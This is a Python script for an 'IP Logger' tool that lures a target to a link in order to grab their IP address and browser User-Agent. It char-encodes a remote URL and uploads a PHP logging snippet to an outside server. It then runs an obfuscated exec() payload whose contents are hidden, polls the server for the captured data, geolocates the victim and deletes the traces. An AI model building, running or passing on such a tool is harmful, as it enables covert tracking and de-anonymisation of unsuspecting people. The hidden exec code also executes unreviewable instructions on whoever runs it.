# coding=utf-8
# Coded By: Æripin
# instagram: Zxulme

from lookup import lookup
import requests,random,sys,time,logging,re

logging.basicConfig(level=logging.INFO)

__banner__="""
━━━╮
━━╮╰╮┊┊┊┊┊┊
┊┊╰╮╰━▂▂▂▂┊┊┊┊┊┊
┊▂╱▔╲▔╱┏┳╮╲┊┊ᶤ.╭╮
▂╲▂▂╱╲╲╰┻┛╱▔▔▔▔┃
╲▂▂╱╭╯╱▔▔╱▔▔▔▽▽╯
┊╱╱╭╯╱▔▔▔╲▂▂△▂△╮
━━━╯╱╱╭━━━━━━━━╯  coded by: ீ͜҉ৡৢ͜͡ÆripiŇꍏீ҉͜ৡৢ͜͡                         
 """
print(__banner__)
class ip_logger(object):
	def __init__(self,features=None):
		if features =="single":
			self.single()
		self.url="%s/{}"%("".join([chr(i) for i in [
			104, 116, 116, 112, 115, 58, 47, 47, 114, 
			97, 110, 99, 104, 49, 57, 57, 46, 106, 111, 
			111, 109, 108, 97, 46, 99, 111, 109, 47
		]]))
		logging.info(" Creating Servers...")
		self.dt()
		
	#<-- cari ip sendiri -->
	def single(self):
		self.ip=raw_input("[?] IP: ")
		if self.ip =="":
			self.single()
		else:
			lookup.crack(self.ip,
						"\n\n"+"-"*15+"TRACKED FROM ipinfo.io"+"-"*15+"\n")
			exit()
	
	#<-- create servers -->
	def dt(self):
		datas="".join([chr(i) for i in [
			10, 60, 63, 112, 104, 112, 10, 32, 32, 32, 
			32, 32, 32, 32, 32, 36, 97, 61, 36, 95, 83, 
			69, 82, 86, 69, 82, 91, 39, 72, 84, 84, 80, 
			95, 85, 83, 69, 82, 95, 65, 71, 69, 78, 84, 
			39, 93, 59, 10, 32, 32, 32, 32, 32, 32, 32, 
			32, 36, 98, 61, 36, 95, 83, 69, 82, 86, 69, 
			82, 91, 39, 82, 69, 77, 79, 84, 69, 95, 65, 
			68, 68, 82, 39, 93, 59, 10, 32, 32, 32, 32, 
			32, 32, 32, 32, 36, 99, 61, 102, 111, 112, 
			101, 110, 40, 39, 123, 125, 46, 116, 120, 
			116, 39, 44, 39, 97, 43, 39, 41, 59, 10, 32, 
			32, 32, 32, 32, 32, 32, 32, 102, 119, 114, 
			105, 116, 101, 40, 36, 99, 44, 34, 36, 98, 
			92, 110, 36, 97, 34, 41, 59, 10, 32, 32, 32, 
			32, 32, 32, 32, 32, 102, 99, 108, 111, 115, 
			101, 40, 36, 99, 41, 59, 10, 63, 62, 10, 32, 
			32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32
		]])
		s=list("abcdefghijklmnopqrstuvwxyz1234567890")
		ss=[]
		for i in range(10):
			ss.append(random.choice(s))
			ss.append(random.choice(s).upper())
		id="".join(ss)
		logging.info((requests.post(self.url.format("genid.php"),
			data={"id":id,"py":datas.format(id)}).text.replace("\n","")))
		self.listen(id)
	
	#<-- Listening Session -->
	def listen(self,id):
		cut=self.url.replace("https://","").replace("/","").format("/"+id+".php")
		# Obfuscated with no-strint (https://github.com/zevtyardt/no-strint)
		ooo0O0o=[(((((((([]>=[])+([]!={})+({}>={}))+(([]>=[])+([]<=())+(()!={}))+(([]>={})-({}>=())))<<((({}=={})+({}!=[]))))-((({}<())+({}==[])))))<<(((()!={})+([]==[]))))), ((((([]>{})+([]>{})+([]==[]))+(({}>={})+([]!={})+({}<=[]))+(([]>={})-(()=={})))<<((([]>={})+([]<()))+(([]>{})+(()>=()))))-((([]>=[])*(()>=())))), (((((((((([]<())+([]>{})+({}!=())))<<((({}<={})+({}<()))))+((([]>[])+([]<())))))))<<((([]<=())+({}=={})+(()!=[]))))-((({}<={})+([]>())))), (((((((((([]<())+([]>{})+({}!=())))<<((({}<={})+({}<()))))+((([]>[])+([]<())))))))<<((([]<=())+({}=={})+(()!=[]))))-((({}<={})+([]>())))), (((((((((([]>={})+(()<=())+({}<())))<<((([]<=[])+([]<=()))))+((([]>=())+([]==[])))))))<<((([]>={})+({}<())+([]>={}))))+(((()<{})+([]<())))), ((((({}!=[])+(()>=())+([]<=[]))+(({}<={})+({}=={})+({}>={}))+(([]==[])+(()<={})))<<((({}<=())+(()>=[]))+(([]!={})+({}<=[]))))-(((({}<=[])+({}>=())))<<((([]>())+({}!=()))))), (((((((((([]<())+([]>{})+({}!=())))<<((({}<={})+({}<()))))+((([]>[])+([]<())))))))<<((([]<=())+({}=={})+(()!=[]))))-((({}<={})+([]>())))), (((((((({}<=[])+({}>={})+(()!=[])))<<((([]>{})+(()>=[])+(()!={}))))-((([]<=())-({}==())))))<<((({}!=())-([]>()))))), (((((((((([]>={})+(()<=())+({}<())))<<((([]<=[])+([]<=()))))+((([]>=())+([]==[])))))))<<((([]>={})+({}<())+([]>={}))))+(((()<{})+([]<())))), ((((({}!=[])+(()>=())+([]<=[]))+(({}<={})+({}=={})+({}>={}))+(([]==[])+(()<={})))<<((({}<=())+(()>=[]))+(([]!={})+({}<=[]))))-(((({}<=[])+({}>=())))<<((([]>())+({}!=()))))), (((((((((([]==[])+([]<=())+({}<())))<<((({}<())+([]<()))))+((([]<={})+(()!=[])))))))<<((([]<=[])+([]>=[])+({}!=()))))-((((()!=[])-([]!=[])))<<(((()>())+(()>={}))))), ((((([]>{})+([]>{})+([]==[]))+(({}>={})+([]!={})+({}<=[]))+(([]>={})-(()=={})))<<((([]>={})+([]<()))+(([]>{})+(()>=()))))-((([]>=[])*(()>=())))), ((((([]<())+([]==[]))+(({}<())+({}>={}))+(([]==[])-([]!=[])))<<((([]<=())+(()<=())+({}<=[]))))), (((((((([]==())+(()!=[])))<<(((()>=[])+(()!=[]))+(({}<=())+(()>{}))))+((([]<=[])+({}==[])))))<<((([]!={})+(()<=[]))))), ((((({}!=())-(()!=())))<<(((()!=[])+(()>=()))+((()>=[])+([]>{}))+(({}<{})+({}!=[]))))), ((((((((()>=())+([]<()))+(([]<())+(()>=[]))+(({}<[])-({}>[])))<<((([]>{})+({}<=()))))-((([]>{})-([]!=[])))))<<(((()>=[])+(()>=()))))), (((((((((([]>={})+(()<=())+({}<())))<<((([]<=[])+([]<=()))))+((([]>=())+([]==[])))))))<<((([]>={})+({}<())+([]>={}))))+(((()<{})+([]<())))), ((((({}!=[])+(()>=())+([]<=[]))+(({}<={})+({}=={})+({}>={}))+(([]==[])+(()<={})))<<((({}<=())+(()>=[]))+(([]!={})+({}<=[]))))-(((({}<=[])+({}>=())))<<((([]>())+({}!=()))))), (((((((({}=={})+([]==[])+([]>{}))+(([]<=[])+([]<=())+([]<()))+(({}<=())*([]<())))<<((({}=={})+([]<=[]))))-((([]>{})*({}=={})))))<<((([]>=[])+(()!=[]))))-(((()>=[])*({}>={})))), ((((({}<[])+(()>={})+([]<()))+(({}!=[])+([]!={})+(()>=[]))+((()>{})-(()=={})))<<(((()>[])+(()!=[])+([]>={}))))+((((()=={})+([]==[])))<<(((()<[])+([]>={}))))), ((((({}!=())-(()!=())))<<(((()!=[])+(()>=()))+((()>=[])+([]>{}))+(({}<{})+({}!=[]))))), (((((((({}<[])+({}<())+(()>=())))<<(((()!=[])+(()!=[])+(()!=[]))))-((([]<())-(()<[])))))<<((({}=={})+(()>=()))))), (((((()<=())+([]<=())+({}<=())))<<(((()!=[])+({}!=[]))+((()>[])+(()!=[]))))), ((((((((((()>[])+([]<=[])+({}<[])))<<((({}!=())+({}>={}))))+((([]>=[])+({}==())))))))<<(((()>=[])+({}>={}))))-((({}<())-({}>=[])))), ((((((((((()>[])+([]<=[])+({}<[])))<<((({}!=())+({}>={}))))+((([]>=[])+({}==())))))))<<(((()>=[])+({}>={}))))-((({}<())-({}>=[])))), (((((((([]!={})+([]!={})+(()>={})))<<(((()>=())+([]!=())+({}>={}))))-(((()!=())+([]==[])))))<<((({}<())+({}<={}))))-((({}!=[])+(()<={})))), ((((([]>{})+([]>=[])+(()!={})))<<((({}=={})+({}<()))+(([]==[])+([]>{}))))+(((()>())+([]!={})))), ((((((((()!={})-({}!={})))<<((([]>={})+({}<()))+(([]>={})+({}<=[]))))-((({}>={})+(()>())))))<<((({}!=[])+({}=={}))))-(((()!={})+([]>[])))), ((((((((((()>[])+([]<=[])+({}<[])))<<((({}!=())+({}>={}))))+((([]>=[])+({}==())))))))<<(((()>=[])+({}>={}))))-((({}<())-({}>=[])))), ((((((((()>[])+(()>=())+({}!=())))<<(((()<=())+([]>={})+(()>[]))))+((([]>={})-({}!={})))))<<((({}!=())*(()>=()))))), (((((((({}<())+([]<())+(()<=()))+(([]>=[])+(()!=[])+({}!=()))+(({}!={})+([]!=())))<<(((()<=())+([]<=[]))))-((({}==())+({}!=())))))<<((({}=={})+(()!={}))))+((([]<=[])+({}>=())))), (((((((((({}>={})+([]<())+({}!=())))<<(((()>[])+({}<={}))))+((([]>[])+({}!=())))))))<<(((()>{})+({}!=())+(()>=()))))), ((((({}>={})+({}<())+({}!=()))+((()>={})+(()<=())+({}<=()))+(({}<{})+([]!={})))<<(((()>={})+({}<=[]))+(([]>={})+(()!=[]))))+(((([]>={})*([]>{})))<<((({}<[])+(()==()))))), ((((({}>={})+({}<())+({}!=()))+((()>={})+(()<=())+({}<=()))+(({}<{})+([]!={})))<<(((()>={})+({}<=[]))+(([]>={})+(()!=[]))))+(((([]>={})*([]>{})))<<((({}<[])+(()==()))))), (((((()>[])+({}<[])+([]>={}))+(({}!=())+(()>=[])+(()>[]))+(([]!=())-(()!=())))<<((({}<=())+({}>={}))+((()!={})+({}<=[]))))), ((((([]!={})+({}!=[])+({}>={}))+(({}<=())+([]>{})+(()==()))+(({}!=())-({}>{})))<<(((()>={})+([]<()))+(([]==[])+(()>[]))))+((({}<[])+([]<())+(()!={})))), ((((({}<[])+(()>={})+([]<()))+(({}!=[])+([]!={})+(()>=[]))+((()>{})-(()=={})))<<(((()>[])+(()!=[])+([]>={}))))+((((()=={})+([]==[])))<<(((()<[])+([]>={}))))), (((((()>={})+(()>={})+({}<=[])))<<(((()>{})+([]!=()))+(({}<=())+(()==()))))-((([]>())+(()>[])))), (((((()>={})+(()>={})+({}<=[])))<<(((()>{})+([]!=()))+(({}<=())+(()==()))))-((([]>())+(()>[])))), (((((((((([]>={})+(()<=())+({}<())))<<((([]<=[])+([]<=()))))+((([]>=())+([]==[])))))))<<((([]>={})+({}<())+([]>={}))))+(((()<{})+([]<())))), ((((({}!=[])+(()>=())+([]<=[]))+(({}<={})+({}=={})+({}>={}))+(([]==[])+(()<={})))<<((({}<=())+(()>=[]))+(([]!={})+({}<=[]))))-(((({}<=[])+({}>=())))<<((([]>())+({}!=()))))), ((((({}>={})+({}<())+({}!=()))+((()>={})+(()<=())+({}<=()))+(({}<{})+([]!={})))<<(((()>={})+({}<=[]))+(([]>={})+(()!=[]))))+(((([]>={})*([]>{})))<<((({}<[])+(()==()))))), (((((((([]==[])+({}<())+({}!=())))<<(((()>=[])+(()>{})+({}<={}))))+((({}!={})+({}<=[])))))<<((([]>={})+(()>={}))))+((([]!={})-({}!={})))), ((((({}!=())+([]>={})+([]>=[]))+(([]<=())+([]>=[])+([]<=[]))+(([]>={})-(()<={})))<<((([]>=[])+([]>=[]))+(({}!=())+(()<=()))))+((((()<={})+(()==())))<<((({}<{})+(()>[]))))), ((((({}!=[])+(()>=())+([]<=[]))+(({}<={})+({}=={})+({}>={}))+(([]==[])+(()<={})))<<((({}<=())+(()>=[]))+(([]!={})+({}<=[]))))-(((({}<=[])+({}>=())))<<((([]>())+({}!=()))))), (((((((([]==[])+({}<())+({}!=())))<<(((()>=[])+(()>{})+({}<={}))))+((({}!={})+({}<=[])))))<<((([]>={})+(()>={}))))+((([]!={})-({}!={})))), ((((({}>={})+({}<())+({}!=()))+((()>={})+(()<=())+({}<=()))+(({}<{})+([]!={})))<<(((()>={})+({}<=[]))+(([]>={})+(()!=[]))))+(((([]>={})*([]>{})))<<((({}<[])+(()==()))))), (((((((({}<())+([]<())+(()<=()))+(([]>=[])+(()!=[])+({}!=()))+(({}!={})+([]!=())))<<(((()<=())+([]<=[]))))-((({}==())+({}!=())))))<<((({}=={})+(()!={}))))+((([]<=[])+({}>=())))), ((((([]>{})+([]>{})+([]==[]))+(({}>={})+([]!={})+({}<=[]))+(([]>={})-(()=={})))<<((([]>={})+([]<()))+(([]>{})+(()>=()))))-((([]>=[])*(()>=())))), ((((({}!=[])+(()>=())+([]<=[]))+(({}<={})+({}=={})+({}>={}))+(([]==[])+(()<={})))<<((({}<=())+(()>=[]))+(([]!={})+({}<=[]))))-(((({}<=[])+({}>=())))<<((([]>())+({}!=()))))), (((((((([]==[])+({}<())+({}!=())))<<(((()>=[])+(()>{})+({}<={}))))+((({}!={})+({}<=[])))))<<((([]>={})+(()>={}))))+((([]!={})-({}!={})))), (((((((([]>={})+(()=={})))<<((([]<())+([]<=()))+(({}=={})+([]>{}))))-(((()>())+([]<=())))))<<((({}<=[])+({}<=[])+({}=={}))))+(((()<=())*(()>[])))), (((((((({}<=[])+({}>={})+(()!=[])))<<((([]>{})+(()>=[])+(()!={}))))-((([]<=())-({}==())))))<<((({}!=())-([]>()))))), (((((((({}<())+([]<())+(()<=()))+(([]>=[])+(()!=[])+({}!=()))+(({}!={})+([]!=())))<<(((()<=())+([]<=[]))))-((({}==())+({}!=())))))<<((({}=={})+(()!={}))))+((([]<=[])+({}>=())))), (((((((([]==[])+({}<())+({}!=())))<<(((()>=[])+(()>{})+({}<={}))))+((({}!={})+({}<=[])))))<<((([]>={})+(()>={}))))+((([]!={})-({}!={})))), (((((()>={})+(()>={})+({}<=[])))<<(((()>{})+([]!=()))+(({}<=())+(()==()))))-((([]>())+(()>[])))), ((((([]!={})+({}!=[])+({}>={}))+(({}<=())+([]>{})+(()==()))+(({}!=())-({}>{})))<<(((()>={})+([]<()))+(([]==[])+(()>[]))))+((({}<[])+([]<())+(()!={})))), ((((({}>={})+({}<())+({}!=()))+((()>={})+(()<=())+({}<=()))+(({}<{})+([]!={})))<<(((()>={})+({}<=[]))+(([]>={})+(()!=[]))))+(((([]>={})*([]>{})))<<((({}<[])+(()==()))))), (((((()>={})+(()>={})+({}<=[])))<<(((()>{})+([]!=()))+(({}<=())+(()==()))))-((([]>())+(()>[])))), (((((()>{})-({}==())))<<(((()!=[])+({}<=())+([]!={}))+((()>=())+({}=={})+({}<={}))))-(((()>[])+(()<=[])))), (((((()>={})+([]<=())+(()<=())))<<((([]>{})+(()>=()))+(({}!=())+({}!=()))+(({}!={})+({}<=()))))+(((()>{})+(()>())))), (((((()>[])+({}<[])+([]>={}))+(({}!=())+(()>=[])+(()>[]))+(([]!=())-(()!=())))<<((({}<=())+({}>={}))+((()!={})+({}<=[]))))), (((((((((([]>={})+(()<=())+({}<())))<<((([]<=[])+([]<=()))))+((([]>=())+([]==[])))))))<<((([]>={})+({}<())+([]>={}))))+(((()<{})+([]<())))), ((((((((()>[])-({}>=[])))<<(((()<=())+({}<[]))+(({}!=[])+([]==[]))))-((([]>={})*(()<=())))))<<((({}<=())+([]>=[]))))+(((()<=())-(()!=())))), (((((()>{})+({}<[])+([]>{})))<<(((()!=[])+(()>[]))+(([]>{})+([]>=[]))+(([]>{})*([]>=[]))))+(((([]>{})-(()<=[])))<<(((()>[])*({}<()))))), (((((()>={})+([]<=())+(()<=())))<<((([]>{})+(()>=()))+(({}!=())+({}!=()))+(({}!={})+({}<=()))))+(((()>{})+(()>())))), (((((((((([]==[])+([]<=())+({}<())))<<((({}<())+([]<()))))+((([]<={})+(()!=[])))))))<<((([]<=[])+([]>=[])+({}!=()))))-((((()!=[])-([]!=[])))<<(((()>())+(()>={}))))), (((((()<=())+([]<=())+({}<=())))<<(((()!=[])+({}!=[]))+((()>[])+(()!=[]))))), (((((()<=())+([]<=())+({}<=())))<<(((()!=[])+({}!=[]))+((()>[])+(()!=[]))))), (((((()>={})+([]<=())+(()<=())))<<((([]>{})+(()>=()))+(({}!=())+({}!=()))+(({}!={})+({}<=()))))+(((()>{})+(()>())))), ((((((((()>[])+(()>=())+({}!=())))<<(((()<=())+([]>={})+(()>[]))))+((([]>={})-({}!={})))))<<((({}!=())*(()>=()))))), (((((((([]!={})+(()>=[])+([]>={})))<<(((()>{})+([]!={})+(()>[]))))+(((()<={})+([]>{})))))<<((([]>={})+([]!=()))))), ((((([]!={})+([]!=())+(()>=()))+((()>[])+(()!={})+({}<[]))+(([]==[])+([]>[])))<<((([]>{})+(()<=())+({}<[]))))+((({}>={})*([]>{})))), (((((()<=())+([]<=())+({}<=())))<<(((()!=[])+({}!=[]))+((()>[])+(()!=[]))))), ((((([]!={})+([]!=())+(()>=()))+((()>[])+(()!={})+({}<[]))+(([]==[])+([]>[])))<<((([]>{})+(()<=())+({}<[]))))+((({}>={})*([]>{})))), (((((()>{})+({}<[])+([]>{})))<<(((()!=[])+(()>[]))+(([]>{})+([]>=[]))+(([]>{})*([]>=[]))))+(((([]>{})-(()<=[])))<<(((()>[])*({}<()))))), (((((()<=())+([]<=())+({}<=())))<<(((()!=[])+({}!=[]))+((()>[])+(()!=[]))))), (((((()>{})+({}<())+([]!=()))+((()>=())+({}>={})+({}!=[]))+(([]!={})+([]<[])))<<((([]>{})+(()>={})+(()<=()))))-((({}>={})-(()<=[])))), (((((()>={})+([]<=())+(()<=())))<<((([]>{})+(()>=()))+(({}!=())+({}!=()))+(({}!={})+({}<=()))))+(((()>{})+(()>())))), (((((((((([]==[])+([]<=())+({}<())))<<((({}<())+([]<()))))+((([]<={})+(()!=[])))))))<<((([]<=[])+([]>=[])+({}!=()))))-((((()!=[])-([]!=[])))<<(((()>())+(()>={}))))), (((((((([]==[])+({}<())+({}!=())))<<(((()>=[])+(()>{})+({}<={}))))+((({}!={})+({}<=[])))))<<((([]>={})+(()>={}))))+((([]!={})-({}!={})))), (((((((((([]==[])+([]<=())+({}<())))<<((({}<())+([]<()))))+((([]<={})+(()!=[])))))))<<((([]<=[])+([]>=[])+({}!=()))))-((((()!=[])-([]!=[])))<<(((()>())+(()>={}))))), ((((([]!={})+([]!=())+(()>=()))+((()>[])+(()!={})+({}<[]))+(([]==[])+([]>[])))<<((([]>{})+(()<=())+({}<[]))))+((({}>={})*([]>{})))), (((((()<=())+({}<[])+(()>[]))+(([]!={})+(()>=[])+([]<()))+((()==())*([]<())))<<((([]>=[])+([]==[])+({}<={}))))-(((([]>={})-(()<{})))<<((({}>=[])+(()>[]))))), (((((()>={})+([]<=())+(()<=())))<<((([]>{})+(()>=()))+(({}!=())+({}!=()))+(({}!={})+({}<=()))))+(((()>{})+(()>())))), ((((((((()>[])+(()>=())+({}!=())))<<(((()<=())+([]>={})+(()>[]))))+((([]>={})-({}!={})))))<<((({}!=())*(()>=()))))), (((((()<=())+({}<[])+(()>[]))+(([]!={})+(()>=[])+([]<()))+((()==())*([]<())))<<((([]>=[])+([]==[])+({}<={}))))-(((([]>={})-(()<{})))<<((({}>=[])+(()>[]))))), (((((((([]!={})+(()>=[])+([]>={})))<<(((()>{})+([]!={})+(()>[]))))+(((()<={})+([]>{})))))<<((([]>={})+([]!=()))))), (((((((((([]<=[])+([]>={})+([]>{})))<<((([]!={})+(()<=()))))+((({}>={})+([]<{})))))))<<((({}>={})+({}<=()))))+((({}<={})*(()>{})))), (((((()>{})+({}<[])+([]>{})))<<(((()!=[])+(()>[]))+(([]>{})+([]>=[]))+(([]>{})*([]>=[]))))+(((([]>{})-(()<=[])))<<(((()>[])*({}<()))))), (((((()<=())+({}<[])+(()>[]))+(([]!={})+(()>=[])+([]<()))+((()==())*([]<())))<<((([]>=[])+([]==[])+({}<={}))))-(((([]>={})-(()<{})))<<((({}>=[])+(()>[]))))), ((((([]!={})+([]!=())+(()>=()))+((()>[])+(()!={})+({}<[]))+(([]==[])+([]>[])))<<((([]>{})+(()<=())+({}<[]))))+((({}>={})*([]>{})))), (((((()<=())+({}<[])+(()>[]))+(([]!={})+(()>=[])+([]<()))+((()==())*([]<())))<<((([]>=[])+([]==[])+({}<={}))))-(((([]>={})-(()<{})))<<((({}>=[])+(()>[]))))), (((((((([]!={})+(()>=[])+([]>={})))<<(((()>{})+([]!={})+(()>[]))))+(((()<={})+([]>{})))))<<((([]>={})+([]!=()))))), ((((((((()>[])+(()>=())+({}!=())))<<(((()<=())+([]>={})+(()>[]))))+((([]>={})-({}!={})))))<<((({}!=())*(()>=()))))), (((((((((([]==[])+([]<=())+({}<())))<<((({}<())+([]<()))))+((([]<={})+(()!=[])))))))<<((([]<=[])+([]>=[])+({}!=()))))-((((()!=[])-([]!=[])))<<(((()>())+(()>={}))))), (((((()>{})+({}<())+([]!=()))+((()>=())+({}>={})+({}!=[]))+(([]!={})+([]<[])))<<((([]>{})+(()>={})+(()<=()))))-((({}>={})-(()<=[])))), (((((()>{})+({}<[])+([]>{})))<<(((()!=[])+(()>[]))+(([]>{})+([]>=[]))+(([]>{})*([]>=[]))))+(((([]>{})-(()<=[])))<<(((()>[])*({}<()))))), (((((((([]!={})+(()>=[])+([]>={})))<<(((()>{})+([]!={})+(()>[]))))+(((()<={})+([]>{})))))<<((([]>={})+([]!=()))))), ((((((((()>[])+(()>=())+({}!=())))<<(((()<=())+([]>={})+(()>[]))))+((([]>={})-({}!={})))))<<((({}!=())*(()>=()))))), ((((((((()>=())+(()!=[])+({}<=[])))<<((({}=={})+([]<=[])+({}<()))))+(((()==())*([]<=[])))))<<((([]>=[])+({}<=()))))-((([]<=())-({}<{})))), (((((()>{})+({}<())+([]!=()))+((()>=())+({}>={})+({}!=[]))+(([]!={})+([]<[])))<<((([]>{})+(()>={})+(()<=()))))-((({}>={})-(()<=[])))), ((((((((()>[])+(()>=())+({}!=())))<<(((()<=())+([]>={})+(()>[]))))+((([]>={})-({}!={})))))<<((({}!=())*(()>=()))))), (((((((([]!={})+(()>=[])+([]>={})))<<(((()>{})+([]!={})+(()>[]))))+(((()<={})+([]>{})))))<<((([]>={})+([]!=()))))), ((((((((()==())+([]!={}))+(([]>{})+({}=={}))+(([]>{})*([]<=())))<<(((()>={})+([]==[]))))-((({}>={})+(()==[])))))<<(((()!={})-({}>()))))), (((((((([]>=[])-([]>[])))<<(((()!={})+(()>={}))+(({}<={})+(()!=[]))))-(((()!=[])*({}>={})))))<<((([]<=())+({}<=())+([]>=[]))))-(((()>[])+(()!=[])+(()>=[])))), ((((({}!=())+([]>={})+([]>=[]))+(([]<=())+([]>=[])+([]<=[]))+(([]>={})-(()<={})))<<((([]>=[])+([]>=[]))+(({}!=())+(()<=()))))+((((()<={})+(()==())))<<((({}<{})+(()>[]))))), (((((((([]>=[])+([]!={})+({}>={}))+(([]>=[])+([]<=())+(()!={}))+(([]>={})-({}>=())))<<((({}=={})+({}!=[]))))-((({}<())+({}==[])))))<<(((()!={})+([]==[]))))), ((((((((()>[])-({}>=[])))<<(((()<=())+({}<[]))+(({}!=[])+([]==[]))))-((([]>={})*(()<=())))))<<((({}<=())+([]>=[]))))+(((()<=())-(()!=())))), (((((((([]==())+(()!=[])))<<(((()>=[])+(()!=[]))+(({}<=())+(()>{}))))+((([]<=[])+({}==[])))))<<((([]!={})+(()<=[]))))), (((((((((([]>{})+([]>={})+({}!=())))<<(((()>=[])+(()!={}))))-((([]>={})*(()>=[])))))))<<(((()>=())+([]==[]))))-(((()==())-([]=={})))), ((((((((()>=())+(()!=[])+({}<=[])))<<((({}=={})+([]<=[])+({}<()))))+(((()==())*([]<=[])))))<<((([]>=[])+({}<=()))))-((([]<=())-({}<{})))), (((((((([]>=[])-([]>[])))<<(((()!={})+(()>={}))+(({}<={})+(()!=[]))))-(((()!=[])*({}>={})))))<<((([]<=())+({}<=())+([]>=[]))))-(((()>[])+(()!=[])+(()>=[])))), ((((({}>={})+({}<())+({}!=()))+((()>={})+(()<=())+({}<=()))+(({}<{})+([]!={})))<<(((()>={})+({}<=[]))+(([]>={})+(()!=[]))))+(((([]>={})*([]>{})))<<((({}<[])+(()==()))))), (((((((((([]>{})+([]>={})+({}!=())))<<(((()>=[])+(()!={}))))-((([]>={})*(()>=[])))))))<<(((()>=())+([]==[]))))-(((()==())-([]=={})))), (((((((([]==())+(()!=[])))<<(((()>=[])+(()!=[]))+(({}<=())+(()>{}))))+((([]<=[])+({}==[])))))<<((([]!={})+(()<=[]))))), (((((((({}<[])+({}<())+(()>=())))<<(((()!=[])+(()!=[])+(()!=[]))))-((([]<())-(()<[])))))<<((({}=={})+(()>=()))))), (((((()<=())+([]<=())+({}<=())))<<(((()!=[])+({}!=[]))+((()>[])+(()!=[]))))), ((((((((((()>[])+([]<=[])+({}<[])))<<((({}!=())+({}>={}))))+((([]>=[])+({}==())))))))<<(((()>=[])+({}>={}))))-((({}<())-({}>=[])))), ((((((((((()>[])+([]<=[])+({}<[])))<<((({}!=())+({}>={}))))+((([]>=[])+({}==())))))))<<(((()>=[])+({}>={}))))-((({}<())-({}>=[])))), (((((((([]!={})+([]!={})+(()>={})))<<(((()>=())+([]!=())+({}>={}))))-(((()!=())+([]==[])))))<<((({}<())+({}<={}))))-((({}!=[])+(()<={})))), (((((()<=())+([]<=())+({}<=())))<<(((()!=[])+({}!=[]))+((()>[])+(()!=[]))))), (((((((({}<())+([]<())+(()<=()))+(([]>=[])+(()!=[])+({}!=()))+(({}!={})+([]!=())))<<(((()<=())+([]<=[]))))-((({}==())+({}!=())))))<<((({}=={})+(()!={}))))+((([]<=[])+({}>=())))), (((((((([]==())+(()!=[])))<<(((()>=[])+(()!=[]))+(({}<=())+(()>{}))))+((([]<=[])+({}==[])))))<<((([]!={})+(()<=[]))))), ((((([]<=())+({}<=()))+(([]>{})+({}!=()))+((()==())-([]>[])))<<((({}<=())+([]<=())+({}<={}))))+((([]<=[])*(()>={}))))]
		exec("".join([chr(i) for i in ooo0O0o]))
		logging.critical(" Send Link To Your Target.")
		logging.info(" Listening Target...")
		while True:
			ok=requests.get(self.url.format("/"+id+".txt"))
			if ok.status_code ==200:
				ip=ok.text.split("\n")[0]
				headers=ok.text.split("\n")[1]
				lookup.crack(ip,
						"\n\n"+"-"*15+"TRACKED FROM ipinfo.io"+"-"*15+"\n")
				print("[+] headers\t: %s"%(headers))
				exec("".join([chr(i) for i in [
					114, 101, 113, 117, 101, 115, 116, 115, 46, 112, 111, 115, 
						116, 40, 115, 101, 108, 102, 46, 117, 114, 108, 46, 102, 111, 
							114, 109, 97, 116, 40, 34, 100, 101, 108, 46, 112, 104, 112, 34, 
						41, 44, 100, 97, 116, 97, 61, 123, 34, 105, 100, 34, 58, 105, 100, 
					125, 41
				]]))
				exit()
					
class menu(object):
	def __init__(self):
		print("[1] Single IP Lookup")
		print("[2] IP Logger\n")
		self.menu()
		
	def menu(self):
		c=raw_input("[Choice> ")
		if c =="":self.menu()
		elif c =="1":ip_logger(features="single")
		elif c =="2":ip_logger(features=None)
		else:print("[!] invalid options.");self.menu()
			
if __name__ =="__main__":
	menu()
